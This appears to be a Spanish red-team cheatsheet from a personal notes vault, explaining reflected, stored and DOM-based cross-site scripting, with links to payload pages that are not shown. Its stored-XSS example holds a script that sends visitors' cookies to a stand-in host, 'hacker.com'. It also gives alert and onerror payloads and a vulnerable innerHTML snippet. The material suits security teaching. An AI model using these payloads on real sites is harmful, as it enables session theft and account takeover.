---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: CheatSheet
linked:
  - "[[XSS - HTML Básico]]"
  - "[[XSS - Etiqueta <script> Estándar]]"
  - "[[XSS - Manejadores de Eventos HTML]]"
  - "[[XSS - Pseudo-protocolos]]"
  - "[[XSS - Manipulación de Sources y Sinks (DOM-based)]]"
  - "[[XSS - Payloads Polyglot]]"
  - "[[XSS - Explotación Out-of-Band (Blind XSS)]]"
  - "[[XSS - Explotación de Mutaciones del Navegador (mXSS)]]"
  - "[[XSS - Escape de Contexto en Atributos]]"
  - "[[XSS - Filtros XSS y WAF mediante Codificaciones Múltiples]]"
---
# Cross-Site Scripting (XSS) 

## Cheatsheet

### 1. Inyecciones Clásicas

````tabs
tab: **Inyección Directa de HTML Básico**
![[XSS - HTML Básico#^xss-html]]

tab: **Inyección de Etiquetas <script>**
![[XSS - Etiqueta <script> Estándar#^xss-script]]

````

### 2. Manipulación de Contextos y Eventos

````tabs
tab: **Inyección de Manejadores de Eventos HTML**
![[XSS - Manejadores de Eventos HTML#^xss-eventos]]

tab: **Inyección de Pseudo-Protocolos**
![[XSS - Pseudo-protocolos#^xss-pseudoprotocolos]]

tab: **Inyección de Escape de Contexto en Atributos**
![[XSS - Escape de Contexto en Atributos#^xss-atributos]]

````

### 3. Técnicas de Evasión

````tabs
tab: **Evasion de Filtros y WAF mediante Codificaciones Múltiples**
![[XSS - Filtros XSS y WAF mediante Codificaciones Múltiples#^xss-waf]]

tab: **Inyección de Payloads Polyglot**
![[XSS - Payloads Polyglot#^xss-polyglot]]

````

### 4. Explotación del Lado del Cliente

````tabs
tab: **Manipulación directa de _Sources_ y _Sinks_**
![[XSS - Manipulación de Sources y Sinks (DOM-based)#^xss-sources]]

tab: **Explotación Out-of-Band (Blind XSS)**
![[XSS - Explotación Out-of-Band (Blind XSS)#^xss-blind]]

tab: **Explotación mediante mutaciones del navegador (mXSS)**
![[XSS - Explotación de Mutaciones del Navegador (mXSS)#^xss-mxss]]

````


## Overview

Las vulnerabilidades de HTML Injection a menudo pueden usarse para realizar ataques **Cross-Site Scripting (XSS)** inyectando código JavaScript que se ejecuta en el cliente. Si podemos ejecutar código en la máquina de la víctima, podemos potencialmente acceder a su cuenta o incluso a su equipo. XSS es muy similar a HTML Injection, pero **XSS inyecta JavaScript** para ataques más avanzados en el cliente, en lugar de solo HTML.

### XSS Reflejado (Reflected)

El script malicioso **no se guarda** en el servidor; viaja en la URL y el servidor lo "refleja" en la respuesta.

- **Vector:** Enlaces maliciosos (Phishing).
- **Persistencia:** Nula (requiere que la víctima haga clic cada vez).

> [!EXAMPLE] Ejemplo de URL
> http://sitio.com/buscar?q=<script>alert('XSS')</script>

**Cómo funciona:**

1. La víctima hace clic en el link.
2. El servidor recibe la `q` y la pone en el HTML de respuesta: `Resultados para: <script>...</script>`.
3. El navegador ejecuta el script.

---

### XSS Almacenado (Stored)

El script malicioso **se guarda** permanentemente en el servidor (Base de datos, foros, comentarios).

- **Vector:** Formularios de comentarios, perfiles de usuario, posts.
- **Persistencia:** Alta (afecta a cualquiera que visite la página).

> [!FAIL] Código Vulnerable (Ejemplo)
> Un atacante comenta en un blog:
> ```HTML
> Excelente post!
> <script>
>   // Envía las cookies de quien lea esto al atacante
>   new Image().src = "http://hacker.com/robo.php?c=" + document.cookie;
> </script>
> ```

**Cómo funciona:**

1. El servidor guarda el comentario.
2. Cuando otros usuarios (o el administrador) cargan el post, el servidor sirve el comentario con el script.
3. El script se ejecuta automáticamente sin que el usuario haga nada extraño.


---

### XSS basado en DOM (DOM-based)

Ocurre enteramente en el **navegador**. El servidor envía la página bien, pero el Javascript del sitio manipula los datos de forma insegura.

- **Fuente (Source):** `location.hash`, `location.search`, `document.referrer`.
- **Sumidero (Sink):** `innerHTML`, `document.write`, `eval()`.
    

> [!BUG] Ejemplo Javascript
> ```JavaScript
> // Toma el texto después del # en la URL y lo pega en el HTML
> var mensaje = location.hash.substring(1);
> document.getElementById('saludo').innerHTML = mensaje;
> ```
> Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, se ejecuta el ataque.


---

### Diferencias Clave

|**Tipo**|**¿Dónde se aloja el payload?**|**¿Quién ve el ataque?**|
|---|---|---|
|**Reflejado**|En la URL (Cliente -> Servidor -> Cliente)|Solo la víctima que hace clic|
|**Almacenado**|Base de Datos del Servidor|Todos los visitantes|
|**DOM-based**|En el navegador (Cliente -> Cliente)|Depende de cómo se comparta el link|

---
